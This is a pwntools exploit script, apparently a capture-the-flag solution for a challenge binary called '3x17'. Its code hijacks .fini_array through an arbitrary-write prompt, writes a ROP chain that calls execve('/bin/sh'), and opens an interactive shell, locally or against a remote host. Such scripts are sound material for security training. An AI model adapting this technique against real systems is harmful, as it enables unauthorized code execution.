#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('3x17')
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x402988
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def arb_write(where, what):
    io.sendafter(b"addr:", str(where).encode())
    io.sendafter(b"data:", what)

def solve():

    fini_array = 0x4b40f0
    main_addr = 0x401B6D
    call_fini = 0x402960

    leave_ret = 0x401c4b # leave ; ret
    ret = leave_ret + 1

    rop_addr = fini_array + 0x10
    binsh   = 0x4b4148
    pop_rax = 0x41e4af # pop rax ; ret
    pop_rdi = 0x401696 # pop rdi ; ret
    pop_rsi = 0x406c30 # pop rsi ; ret
    pop_rdx = 0x446e35 # pop rdx ; ret
    syscall = 0x471db5 # syscall; ret;

    arb_write(fini_array, p64(call_fini) + p64(main_addr))

    payload = flat(
        [
            pop_rax,
            0x3b,
            pop_rdi,
            binsh,
            pop_rsi,
            0x0,
            pop_rdx,
            0x0,
            syscall,
            b"/bin/sh\x00"
        ]
    )

    for i in range(0, len(payload), 24):
        arb_write(rop_addr + i, payload[i:i+24])

    arb_write(fini_array, p64(leave_ret) + p64(ret))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

